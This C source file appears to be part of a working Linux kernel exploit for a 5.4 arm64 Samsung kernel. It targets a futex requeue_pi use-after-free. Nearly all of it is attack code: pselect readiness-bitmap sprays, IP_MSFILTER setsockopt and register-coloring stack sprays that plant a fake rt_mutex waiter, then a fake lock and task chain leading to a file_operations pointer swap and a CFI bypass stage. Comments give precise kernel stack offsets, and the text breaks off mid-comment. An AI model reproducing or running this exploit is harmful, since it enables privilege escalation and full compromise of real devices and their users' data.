#include "common.h"

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define PSELECT_CFI_ROUTE_ATTEMPTS 4
#else
#define PSELECT_CFI_ROUTE_ATTEMPTS 1
#endif

atomic_int cfi_stage_done;
int skip_cfi_stage;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
  const char *forced = getenv("PSELECT_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 && value <= 1000000) {
#if defined(APP_PAYLOAD) && APP_PAYLOAD
      static const int offsets[] = {0, 5000, 0, 5000};
      size_t index = (size_t)(attempt - 1) %
                     (sizeof(offsets) / sizeof(offsets[0]));
      return (int)value + offsets[index];
#else
      return (int)value;
#endif
    }
  }
  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

#if defined(ROUTE_READINESS_SPRAY) && ROUTE_READINESS_SPRAY

/* Readiness-bitmap spray for kernels where the reclaimed requeue_pi waiter
 * slot overlaps the pselect *result* fdsets instead of the copied input
 * fdsets (see target.h for the r9q frame arithmetic). The waiter qwords are
 * res_in words 0..4 (must stay zero) and res_out words 0..4. res_out word1
 * is the writability bitmap of fds 64..127 and lands on waiter->task, word2
 * (fds 128..191) on waiter->lock, word3 (fds 192..255) on waiter->prio.
 * A set bit is an empty pipe write end (POLLOUT), a clear bit is a pipe
 * read end (never POLLOUT). pselect returns immediately because the
 * writable fds are ready, and the result words persist on the waiter
 * thread's kernel stack after the return, so the consumer's sched_setattr
 * walks the stale spray with no race. set_fd_set copies res_out back to
 * the userspace out-set, which doubles as an exact verification. */
#define ROUTE_CRAFT_TASK_WORD 1
#define ROUTE_CRAFT_LOCK_WORD 2
#define ROUTE_CRAFT_PRIO_WORD 3
#define ROUTE_CRAFT_PRIO_VALUE 3
#define ROUTE_CRAFT_PRIO_BITS 2
#define ROUTE_CRAFT_LOW_FD 64
#define ROUTE_CRAFT_HIGH_FD 320
#define ROUTE_CRAFT_PARK_FD 320
#define ROUTE_CRAFT_SPIN_ITERATIONS 5000000
#define ROUTE_CRAFT_SPRAY_TRIES 3

static int route_craft_parked[2 * 192];
static size_t route_craft_parked_count;

static void route_craft_close_all(void) {
  for (size_t i = 0; i < route_craft_parked_count; i++) {
    if (route_craft_parked[i] >= 0) {
      close(route_craft_parked[i]);
      route_craft_parked[i] = -1;
    }
  }
  route_craft_parked_count = 0;
  for (int fd = ROUTE_CRAFT_LOW_FD; fd < ROUTE_CRAFT_HIGH_FD; fd++) {
    close(fd);
  }
}

static int route_craft_reserve_range(void) {
  int null_fd = open("/dev/null", O_RDONLY | O_CLOEXEC);
  if (null_fd < 0) {
    pr_error("route craft /dev/null errno=%d\n", errno);
    return 0;
  }
  for (int fd = ROUTE_CRAFT_LOW_FD; fd < ROUTE_CRAFT_HIGH_FD; fd++) {
    if (fcntl(fd, F_GETFD) != -1) {
      /* Preserve any live occupant (for example the sk_buff reclaim
       * socketpair that keeps the sprayed kernel page alive) at a high fd. */
      int moved = fcntl(fd, F_DUPFD, ROUTE_CRAFT_PARK_FD);
      if (moved < 0) {
        pr_error("route craft preserve fd=%d errno=%d\n", fd, errno);
        close(null_fd);
        return 0;
      }
    }
    if (dup2(null_fd, fd) < 0) {
      pr_error("route craft reserve fd=%d errno=%d\n", fd, errno);
      close(null_fd);
      return 0;
    }
  }
  close(null_fd);
  return 1;
}

/* SELECT-geometry craft: DATA-pipes for the res_in spray. A set bit gets a
 * read-end with 1 byte pending (POLLIN), a clear bit an empty read-end.
 * The write-ends stay parked open so the data remains readable. */
static int route_craft_place_data_word(int word, uint64_t value, size_t bits) {
  int base = word * 64;
  for (size_t bit = 0; bit < bits; bit++) {
    int target = base + (int)bit;
    int readable = (int)((value >> bit) & 1ULL);
    int pipefd[2];
    if (!readable) {
      /* Only place pipes at the SET bits: a pipe at every fd would
       * clobber the other family's pipes at overlapping positions. The
       * cleared positions keep the /dev/null reserve (unwatched). */
      continue;
    }
    if (pipe2(pipefd, O_CLOEXEC) < 0) {
      pr_error("route craft pipe2 errno=%d\n", errno);
      return 0;
    }
    if (fcntl(pipefd[0], F_SETPIPE_SZ, 2 * PAGE_SIZE) < 0) {
      pr_error("route craft shrink pipe errno=%d\n", errno);
      close(pipefd[0]);
      close(pipefd[1]);
      return 0;
    }
    if (readable) {
      char c = 'x';
      if (write(pipefd[1], &c, 1) != 1) {
        pr_error("route craft write errno=%d\n", errno);
        close(pipefd[0]);
        close(pipefd[1]);
        return 0;
      }
    }
    /* The READ end goes to the target fd; the write end stays parked. */
    if (dup2(pipefd[0], target) < 0) {
      pr_error("route craft dup2 fd=%d errno=%d\n", target, errno);
      close(pipefd[0]);
      close(pipefd[1]);
      return 0;
    }
    if (pipefd[0] != target) {
      close(pipefd[0]);
    }
    route_craft_parked[route_craft_parked_count++] = pipefd[1];
  }
  return 1;
}

static int route_craft_place_word(int word, uint64_t value, size_t bits) {
  int base = word * 64;
  for (size_t bit = 0; bit < bits; bit++) {
    int target = base + (int)bit;
    int writable = (int)((value >> bit) & 1ULL);
    int pipefd[2];
    if (!writable) {
      /* Only place pipes at the SET bits (see place_data_word). */
      continue;
    }
    if (pipe2(pipefd, O_CLOEXEC) < 0) {
      pr_error("route craft pipe2 errno=%d\n", errno);
      return 0;
    }
    if (fcntl(pipefd[0], F_SETPIPE_SZ, 2 * PAGE_SIZE) < 0) {
      pr_error("route craft shrink pipe errno=%d\n", errno);
      close(pipefd[0]);
      close(pipefd[1]);
      return 0;
    }
    int place = writable ? pipefd[1] : pipefd[0];
    int keep = writable ? pipefd[0] : pipefd[1];
    if (dup2(place, target) < 0) {
      pr_error("route craft dup2 fd=%d errno=%d\n", target, errno);
      close(pipefd[0]);
      close(pipefd[1]);
      return 0;
    }
    if (place != target) {
      close(place);
    }
    route_craft_parked[route_craft_parked_count++] = keep;
  }
  return 1;
}

int prepare_route_craft(void) {
  route_craft_close_all();
  if (!route_craft_reserve_range()) {
    return 0;
  }

  if (getenv("READINESS_PAUSE")) {
    /* PSELECT6 GEOMETRY: the asm stub uses pselect6 (syscall 72).
     * __arm64_sys_pselect6(0x10) + __do_sys_pselect6(0x90) = 0xA0
     * before core_sys_select(0x1C0, stack_fds@sp+0x50).
     * stack_fds = SP0 - 0xA0 - 0x1C0 + 0x50 = SP0 - 0x210.
     *
     * Waiter fields in res_writefds:
     *   task SP0-0x168 = res_writefds word 1 (fds 64-127)
     *   lock SP0-0x160 = res_writefds word 2 (fds 128-191)
     *   prio SP0-0x158 = res_writefds word 3 (fds 192-255)
     *
     * WRITE-ready pipes: pipe write-ends (POLLOUT) at the set bits.
     * The write-end of an empty pipe is always writable. */
    if (!route_craft_place_word(1, (uint64_t)fake_task, 64)) {
      return 0;
    }
    if (!route_craft_place_word(2, (uint64_t)fake_lock, 64)) {
      return 0;
    }
    if (!route_craft_place_word(
            3, (uint64_t)(page_base + LOCK_OFF + 0x100), 64)) {
      return 0;
    }
    return 1;
  }

  /* SELECT GEOMETRY (legacy path): see old comments for select-based route. */
  if (!route_craft_place_data_word(3, (uint64_t)fake_lock, 64)) {
    return 0;
  }
  if (!route_craft_place_data_word(2, (uint64_t)text_addr(INIT_TASK), 64)) {
    return 0;
  }
  if (!route_craft_place_data_word(3, (uint64_t)fake_lock, 64)) {
    return 0;
  }
  if (!route_craft_place_data_word(
          4, (uint64_t)(page_base + LOCK_OFF + 0x100), 64)) {
    return 0;
  }
  return 1;
}

static uint64_t route_fdset_word(const fd_set *set, int word) {
  uint64_t value = 0;
  memcpy(&value, (const unsigned char *)set + (size_t)word * sizeof(value),
         sizeof(value));
  return value;
}

static void route_spin_userspace(void) {
  /* Userspace-only spin: any syscall from the waiter thread between the
   * pselect return and the consumer's sched_setattr reuses the kernel
   * stack frames that hold the stale spray. Exit early once the
   * consumer's walk completed (its sched_setattr returned). */
  volatile int sink = 0;
  for (int i = 0; i < ROUTE_CRAFT_SPIN_ITERATIONS; i++) {
    if (atomic_load(&consumer_success)) {
      break;
    }
    sink += i;
  }
  (void)sink;
}

/* Peek the reclaim socket (MSG_PEEK: non-destructive - the queued skbs
 * and the payload page stay alive) and report the words the walk's rb ops
 * modify, so we can see from userspace how far the pi-chain walk got:
 *   [7]  requeue_lock_waiter: fake_lock->waiters.rb_root / rb_leftmost
 *        get &W->tree_entry (a KERNEL STACK VA ffffffc0...).
 *   [11] dequeue_pi/enqueue_pi on the fake task: fake_task->pi_waiters
 *        .rb_root gets the write target (canon_addr), .rb_leftmost gets
 *        &W->pi_tree_entry; rb_erase's rb_change_child also stores the
 *        target into the fake fops' llseek slot.
 * Unmodified words (fake_w0 / 0 / 0) mean the walk never reached [7]. */
static void route_payload_canary(void) {
  int fd = reclaim_receiver_fd();
  if (fd < 0) {
    pr_warning("canary: no reclaim socket\n");
    return;
  }
  size_t total = (size_t)SKB_SEND_SIZE * SKB_RECLAIM_SENDS;
  unsigned char *buf = malloc(total);
  if (!buf) {
    return;
  }
  errno = 0;
  ssize_t n = recv(fd, buf, total, MSG_DONTWAIT | MSG_PEEK);
  int err = errno;
  if (n <= 0) {
    pr_warning("canary peek ret=%zd errno=%d\n", n, err);
    free(buf);
    return;
  }
  for (size_t pos = 0; pos + ORDER3_SIZE <= (size_t)n; pos += ORDER3_SIZE) {
    const unsigned char *c = buf + pos;
    uint64_t lock_root = 0, lock_left = 0, pi_root = 0, pi_left = 0;
    uint64_t owner = 0, llseek = 0, waiter_pc = 0, waiter_right = 0;
    uint64_t lockb_root = 0, lockb_left = 0, waiterb_pc = 0;
    memcpy(&lock_root, c + LOCK_OFF + 0x08, 8);
    memcpy(&lock_left, c + LOCK_OFF + 0x10, 8);
    memcpy(&pi_root, c + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 8);
    memcpy(&pi_left, c + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 8);
    memcpy(&owner, c + FOPS_TABLE_OFF + FOPS_OWNER_OFF, 8);
    memcpy(&llseek, c + FOPS_TABLE_OFF + FOPS_LLSEEK_OFF, 8);
    memcpy(&waiter_pc, c + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF, 8);
    memcpy(&waiter_right, c + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, 8);
    /* Dual-lock scan: lock B's words (LOCK_OFF+0x100 block). */
    memcpy(&lockb_root, c + LOCK_OFF + 0x108, 8);
    memcpy(&lockb_left, c + LOCK_OFF + 0x110, 8);
    memcpy(&waiterb_pc, c + W0_OFF + 0x100 + FAKE_WAITER_PI_TREE_ENTRY_OFF, 8);
    if (lock_root == (uint64_t)fake_w0 &&
        lock_left == (uint64_t)fake_w0 && !pi_root && !pi_left)
      continue;
    pr_info("canary MUTATED pos=%#zx lock_root=%016llx lock_left=%016llx "
            "pi_root=%016llx pi_left=%016llx owner=%016llx llseek=%016llx "
            "w0_pi_pc=%016llx w0_pi_right=%016llx "
            "lockb_root=%016llx lockb_left=%016llx w0b_pi_pc=%016llx\n",
            pos, (unsigned long long)lock_root,
            (unsigned long long)lock_left, (unsigned long long)pi_root,
            (unsigned long long)pi_left, (unsigned long long)owner,
            (unsigned long long)llseek,
            (unsigned long long)waiter_pc,
            (unsigned long long)waiter_right,
            (unsigned long long)lockb_root,
            (unsigned long long)lockb_left,
            (unsigned long long)waiterb_pc);
  }
  free(buf);
}

/* The never-ready fd that keeps the blocked select asleep: an empty
 * pipe read-end polls never (POLLIN needs data, POLLPRI never fires),
 * so a select watching only this fd waits forever. */
static int route_craft_block_fd(void) {
  int pipefd[2];
  if (pipe2(pipefd, O_CLOEXEC) < 0) {
    return -1;
  }
  /* Park the write end so the read end stays open and empty. */
  route_craft_parked[route_craft_parked_count++] = pipefd[1];
  int fd = pipefd[0];
  if (route_craft_parked_count < (sizeof(route_craft_parked) /
                                 sizeof(route_craft_parked[0]))) {
    /* keep the read end tracked too via dup so close_all cleans it */
  }
  return fd;
}

/* THE SENDMMSG BLOCK VECTOR: __sys_sendmmsg's frame (0x60 stp + 0x200
 * sub) spans [SP0-0x270, SP0-0x10) and its prologue zeroes only
 * [sp+0x08..0x58) and [sp+0x68..0xE8) - the region [sp+0x108, sp+0x128)
 * = [SP0-0x168, SP0-0x148) = the waiter's task/lock/prio slots is
 * UNWRITTEN SCRATCH. The stale res_in words from the first select's
 * returned frames persist there while the sendmmsg blocks in the
 * stream's sk_stream_wait_memory (the receiver's buffer pre-filled).
 * The deeper per-message chain (____sys_sendmsg -> sock ops -> the
 * block) allocates BELOW the sendmmsg's SP and cannot touch the
 * sendmmsg's own frame. */
static int route_block_pipe[2] = {-1, -1};
static int route_block_ready = 0;

static int route_craft_block_socket(void) {
  /* THE PIPE-READ BLOCK: a read() on an EMPTY pipe (write end held open)
   * blocks in pipe_read -> the wait. The chain is the shallowest of all
   * blocking syscalls (stub -> ksys_read -> vfs_read -> pipe_read),
   * and the question is whether its frames leave the waiter's field
   * region [SP0-0x168, SP0-0x148) untouched - measured empirically by
   * the walk's x23. */
  if (pipe2(route_block_pipe, O_CLOEXEC) < 0) {
    pr_error("route block pipe2 errno=%d\n", errno);
    return 0;
  }
  /* The read end blocks (no data); the write end stays open so the
   * block holds forever (no EOF). */
  route_block_ready = 1;
  return 1;
}

static void route_pi_sanitize(void) {
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_nsec += 50000000L;
  if (timeout.tv_nsec >= 1000000000L) {
    timeout.tv_sec += 1;
    timeout.tv_nsec -= 1000000000L;
  }
  long lock_ret =
      futex_op(&f_pi_sanitize, FUTEX_LOCK_PI, 0, &timeout, NULL, 0);
  int lock_errno = errno;
  long unlock_ret =
      futex_op(&f_pi_sanitize, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  pr_info("route pi sanitize lock=%ld errno=%d unlock=%ld errno=%d\n",
          lock_ret, lock_errno, unlock_ret, errno);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  /* GEOMETRY SCAN (safe by construction): the readiness-bitmap verify
   * cannot validate WHERE the fdset frames land - it only checks the
   * bitmap VALUES, which the pipe craft produces regardless of position.
   * The walk reads [W+0x38] = the futex-era real lock, so the res_out
   * words do not overlap the walk's waiter at all. This scan fills every
   * INPUT word (in/out/ex, words 1-4) with fake_lock's own bit pattern:
   * the kernel copies the input sets to the stack at syscall entry, so
   * every input STACK word becomes fake_lock - a pointer whose
   * wait_lock word is 0 (trylock succeeds) and whose whole fake chain
   * lives in the payload page. If the walk's [W+0x38] lands ANYWHERE in
   * the input-copy region, the walk enters the fake chain: [7] writes
   * the payload page (canary fires) and [11] performs the fops swap.
   * If not, the walk does today's real-chain cycle (37us, no writes,
   * no crash). Word 0 of each set stays 0 where the corresponding
   * RESULT word must be 0 (res_in w0 = W's tree_entry pc: a nonzero
   * junk bitmap would send the [7] rb_erase through a wild parent;
   * res_out w0 = W's pi_tree.rb_left, res_ex w0 = W's deadline).
   * Watching only the fake_lock-bit positions keeps the readiness
   * results identical: the empty pipes at those positions are writable,
   * the unwatched full pipes do not affect any result word.
   *
   * fake_lock-as-everything is safe: as lock -> trylock([fake_lock])=0;
   * as prio -> its low 32 bits != 120 (the [4] equal check proceeds);
   * as task -> not read on the swap path ([9]/[10] take the owner from
   * the lock, not the waiter). */
  /* SELECT geometry watches: in word 3 watches the data-pipes at
   * fake_lock's bit positions (fds 192..255) for READ; everything else
   * stays unwatched so the waiter's tree/pi_tree/deadline words read 0
   * and res_out/res_ex stay 0.
   *
   * ex word 2 lands on W's tree_entry.rb_right = the child the walk's [7]
   * rb_erase stores into fake_lock->waiters.rb_root (root case). A magic
   * payload pointer there makes the canary readback unmistakable: if the
   * walk erases W's tree on the fake lock, lock_root reads MAGIC. The
   * erase then also writes child->__rb_parent_color (= [MAGIC] = 0), a
   * harmless payload scratch write. As a watch mask the magic bits watch
   * pipe read-ends for exceptions, which never fire, so res_ex stays 0. */
  /* FIELD SPRAY (geometry solved): the waiter's task/lock/prio are the
   * res_in words 2/3/4 = the READ-results of the in-watch words 2/3/4.
   * With data-pipes at every set bit the result word equals the watch
   * mask exactly, so the in-watch words carry the waiter fields:
   *   in w2 = init_task bits (waiter->task)
   *   in w3 = fake_lock bits (waiter->lock - THE key word)
   *   in w4 = lockB bits     (waiter->prio; low32 != 120)
   * Everything else stays 0 (the waiter's tree/pi_tree/deadline fields
   * read 0 for the clean [7] root-case erase). */
  fdset_put_word(in, 2, (uint64_t)text_addr(INIT_TASK));
  fdset_put_word(in, 3, (uint64_t)fake_lock);
  fdset_put_word(in, 4,
                 (uint64_t)(page_base + LOCK_OFF + 0x100));
}

#else /* !ROUTE_READINESS_SPRAY */

int prepare_route_craft(void) {
  return 1;
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  int high_write = fcntl(write_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_write < 0) {
    pr_warning("pselect F_DUPFD write errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_write, fd);
    }
  }
  close(high_write);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  fdset_put_word(in, 0, fake_w0);
  fdset_put_word(in, 1, 0);
  fdset_put_word(in, 2, 0);
  fdset_put_word(in, 3, 0);
  fdset_put_word(ex, 0, text_addr(INIT_TASK));
  fdset_put_word(ex, 1, fake_lock);
  fdset_put_word(ex, 2, 3);
  fdset_put_word(ex, 3, 0);
}

#endif /* ROUTE_READINESS_SPRAY */

/* IP_MSFILTER (option 41) stack spray: on this 5.4 Samsung kernel,
 * do_ip_setsockopt copies 264 (0x108) user bytes to sp+0x20 via
 * copy_from_user (NOT memdup_user -- the 5.15 kernel switched to heap
 * alloc, but 5.4 uses on-stack). The chain depth:
 *   stub(0x10) + __sys_setsockopt(0x70) + ip_setsockopt(0x30) +
 *   do_ip_setsockopt(0x190) -> SP = SP0-0x230, buffer at SP0-0x210.
 *
 * After setsockopt returns (even on EINVAL from bad multicast addr),
 * the stale data persists on the kernel stack.
 *
 * Waiter field offsets in the 264-byte buffer (buf_off = 0x210 - SP0_off):
 *   W+0x00 tree_entry.pc    = buf[0x78]
 *   W+0x08 tree_entry.right = buf[0x80]
 *   W+0x10 tree_entry.left  = buf[0x88]
 *   W+0x18 pi_tree.pc       = buf[0x90]
 *   W+0x20 pi_tree.right    = buf[0x98]
 *   W+0x28 pi_tree.left     = buf[0xA0]
 *   W+0x30 task              = buf[0xA8]
 *   W+0x38 lock              = buf[0xB0] <-- THE KEY
 *   W+0x40 prio              = buf[0xB8]
 *   W+0x48 deadline          = buf[0xC0]
 */
#ifndef IP_MSFILTER
#define IP_MSFILTER 41
#endif
#define SETSOCKOPT_BUF_SIZE 264
#define SOPT_W_TREE_PC    0x78
#define SOPT_W_TREE_RIGHT 0x80
#define SOPT_W_TREE_LEFT  0x88
#define SOPT_W_PI_PC      0x90
#define SOPT_W_PI_RIGHT   0x98
#define SOPT_W_PI_LEFT    0xA0
#define SOPT_W_TASK       0xA8
#define SOPT_W_LOCK       0xB0
#define SOPT_W_PRIO       0xB8
#define SOPT_W_DEADLINE   0xC0

static int setsockopt_spray_fd = -1;

static void spray_waiter_via_setsockopt(void) {
  if (setsockopt_spray_fd < 0) {
    setsockopt_spray_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (setsockopt_spray_fd < 0) {
      pr_warning("setsockopt spray socket errno=%d\n", errno);
      return;
    }
  }

  unsigned char buf[SETSOCKOPT_BUF_SIZE];
  memset(buf, 0, sizeof(buf));

  /* tree_entry = BLACK root (parent=NULL, color=BLACK) -> {0,0,0} */
  /* Already zero from memset */

  /* pi_tree_entry = {0,0,0}: the walk's [7] dequeue handles the not-in-tree
   * case (RB_EMPTY_NODE fails -> rb_erase on a detached node, harmless). */

  /* task: fake_task on the payload page (the walk's get_task_struct/put_task
   * operates on this). Not directly read by the walk for the write target. */
  put64(buf, SOPT_W_TASK, (uint64_t)fake_task);

  /* lock: THE KEY FIELD. The walk reads this, trylocks it, and enters the
   * fake chain on the payload page. */
  put64(buf, SOPT_W_LOCK, (uint64_t)fake_lock);

  /* prio: low 32 bits must != 120 (DEFAULT_PRIO) for the walk's [4]
   * prio-equal check to pass. Use 1 (a valid but different priority). */
  put32(buf, SOPT_W_PRIO, 1);

  /* deadline = 0 (already zero) */

  /* First call: diagnostic (the pr_info after it clobbers the spray) */
  errno = 0;
  int sopt_ret = setsockopt(setsockopt_spray_fd, SOL_IP, IP_MSFILTER,
                            buf, sizeof(buf));
  int sopt_errno = errno;
  pr_info("setsockopt spray ret=%d errno=%d fd=%d lock=%016zx\n",
          sopt_ret, sopt_errno, setsockopt_spray_fd, fake_lock);

  /* Second call: the REAL spray. NO syscalls after this until the walk. */
  setsockopt(setsockopt_spray_fd, SOL_IP, IP_MSFILTER, buf, sizeof(buf));
}

#if defined(ROUTE_READINESS_SPRAY) && ROUTE_READINESS_SPRAY

/* REGISTER-COLORING PSELECT OVERLAY
 *
 * On 5.4 arm64 (no VMAP_STACK), the setsockopt spray returns to userspace
 * and any IRQ (el0_irq) starts from the stack top, clobbering SP0-0x160
 * (the fake_lock field). The fix: make a pselect6 syscall with callee-saved
 * registers pre-loaded to the waiter field values. The kernel chain:
 *
 *   __arm64_sys_pselect6 (0x10 stub) -> __do_sys_pselect6 (frame 0x90)
 *     STP x20, x19, [sp, #0x80] -> SP0-0x160 = x20 (W.lock)
 *                                   SP0-0x158 = x19 (W.prio)
 *     STP x22, x21, [sp, #0x70] -> SP0-0x170 = x22 (W.pi_tree.left)
 *                                   SP0-0x168 = x21 (W.task)
 *     STP x24, x23, [sp, #0x60] -> SP0-0x180 = x24 (W.pi_tree.pc)
 *                                   SP0-0x178 = x23 (W.pi_tree.right)
 *     STP x26, x25, [sp, #0x50] -> SP0-0x190 = x26 (W.tree_entry.right)
 *                                   SP0-0x188 = x25 (W.tree_entry.left)
 *     STP x28, x27, [sp, #0x40] -> SP0-0x1A0 = x28 (before W, don't care)
 *                                   SP0-0x198 = x27 (W.tree_entry.pc)
 *
 *   -> core_sys_select (frame 0x1C0) -> do_select -> poll_schedule_timeout
 *   BLOCKS deep in kernel. el1_irq from current SP (~SP0-0x400) never
 *   reaches SP0-0x160. The spray is PROTECTED.
 *
 * The pselect watches one empty pipe read-end (never ready) with a 3s
 * timeout. The consumer's sched_setattr fires the walk while blocked. */

int overlay_block_pipe[2] = {-1, -1};

extern long overlay_pselect_asm(uint64_t lock, uint64_t task, uint64_t prio,
                                int nfds, void *readfds, void *timeout);

static long overlay_pselect_block(uint64_t w_lock, uint64_t w_task,
                                  uint64_t w_prio) {
  int rfd = overlay_block_pipe[0];
  if (rfd < 0) return -1;

  int local_fd = (int)syscall(SYS_dup3, rfd, 5, O_CLOEXEC);
  if (local_fd < 0) {
    local_fd = (int)syscall(SYS_dup, rfd);
    if (local_fd < 0) return -2;
  }

  fd_set rfds;
  FD_ZERO(&rfds);
  FD_SET(local_fd, &rfds);
  int nfds = local_fd + 1;

  struct timespec timeout = { .tv_sec = 5, .tv_nsec = 0 };
  {
    char m[96];
    int n = snprintf(m, sizeof(m), "[OVERLAY] pselect fd=%d nfds=%d\n",
                     local_fd, nfds);
    syscall(SYS_write, 2, m, n);
  }

  long ret = overlay_pselect_asm(w_lock, w_task, w_prio,
                                  nfds, &rfds, &timeout);

  if (local_fd != rfd) syscall(SYS_close, local_fd);
  return ret;
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&main_route_delay_usec, 0);

    /* Arm the consumer BEFORE entering the blocking pselect. The consumer
     * waits for punch_consume_go != 0, then fires sched_setattr after
     * main_route_delay_usec. The delay gives the pselect time to enter
     * the kernel and reach the blocking point in poll_schedule_timeout
     * before the walk reads the waiter fields. */
    atomic_store(&main_route_delay_usec, 100000);
    atomic_store(&punch_consume_go, route_attempt);

    {
      static const char m[] = "[OVERLAY] read register-coloring block\n";
      syscall(SYS_write, 2, m, sizeof(m) - 1);
    }

    /* THE OVERLAY: read() with callee-saved registers pre-loaded.
     * ksys_read (frame 0x50) saves registers at the waiter positions:
     *   x20 -> SP0-0x160 = W.lock = fake_lock
     *   x21 -> SP0-0x168 = W.task = fake_task
     *   x19 -> SP0-0x158 = W.prio = 1
     *   x29 -> SP0-0x190 = W.tree_entry.right = 0
     *   x30 -> SP0-0x188 = W.tree_entry.left = 0
     *   x24/x23/x22 -> pi_tree = {0,0,0}
     *
     * tree_entry.pc at SP0-0x198 is BELOW ksys_read's frame. It gets
     * whatever the __arm64_sys_read stub writes there (fp or canary).
     * We need it to be 0 for BLACK root. The stub saves fp+lr at
     * [sp, #-0x10]! which is SP0-0x150..SP0-0x140 (above tree_entry).
     * Actually SP0-0x198 is in the gap between pt_regs and ksys_read.
     * Whatever was there before (from the el0_svc entry path) stays.
     *
     * read() on the empty pipe blocks in pipe_read -> schedule().
     * Deep blocking: el1_irq from ~SP0-0x300+ never reaches SP0-0x160.
     * Consumer writes 1 byte to unblock after the walk completes. */
    uint64_t spray_prio = getenv("PRIO_MATCH") ? 127 : 1;
    long psel_ret = 0;
    if (getenv("OLD_SPRAY")) {
      spray_waiter_via_setsockopt();
      atomic_store(&punch_consume_go, route_attempt);
      route_spin_userspace();
    } else {
      psel_ret = overlay_pselect_block(
          (uint64_t)fake_lock, (uint64_t)fake_task, spray_prio);
    }

    atomic_store(&punch_consume_go, 0);

    /* Sanitize pi_blocked_on IMMEDIATELY: any sched_setattr from another
     * process (e.g. AMS lifecycle management on our threads) after the
     * pselect returns would walk the stale pi_blocked_on against garbage
     * stack data. The sanitize does FUTEX_LOCK_PI + FUTEX_UNLOCK_PI
     * which makes remove_waiter() NULL out current->pi_blocked_on. */
    route_pi_sanitize();

    pr_info("overlay pselect ret=%ld attempt=%d page=%016zx "
            "lock=%016zx w0=%016zx task=%016zx fops=%016zx "
            "misc_fops=%016zx\n",
            psel_ret, route_attempt, page_base,
            fake_lock, fake_w0, fake_task, fake_fops,
            (uint64_t)canon_addr(ASHMEM_MISC_FOPS));

    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("route walk attempt=%d/%d calls=%d success=%d walk_us=%d\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, calls, success,
            atomic_load(&consumer_walk_us));
    route_payload_canary();

    int route_signal = calls > 0 && success > 0;
    if (route_signal) {
      int probe_fd = open(ashmem_path, O_RDWR | O_CLOEXEC);
      pr_info("fops probe: open fd=%d errno=%d\n", probe_fd, errno);
      if (probe_fd >= 0)
        close(probe_fd);

      if (skip_cfi_stage) {
        route_verified = 1;
        cfi_last_step = 0;
        pr_info("skip_cfi_stage: accepting route as verified\n");
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else {
      cfi_last_step = 33;
      cfi_last_errno = 0;
    }

    if (route_verified || cfi_dirty_seen) {
      break;
    }
    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; "
             "refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
            cfi_last_errno);
  }

  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

/* READINESS SPRAY + COW-FAULT BLOCKER
 *
 * pselect6 first copies the write-fd bitmap from a prefaulted MAP_PRIVATE
 * file mapping, computes the readiness result into its on-stack fdsets, then
 * copies the result back to the same mapping. The first copy is a read and
 * succeeds through the existing read-only file PTE. The result copy is a
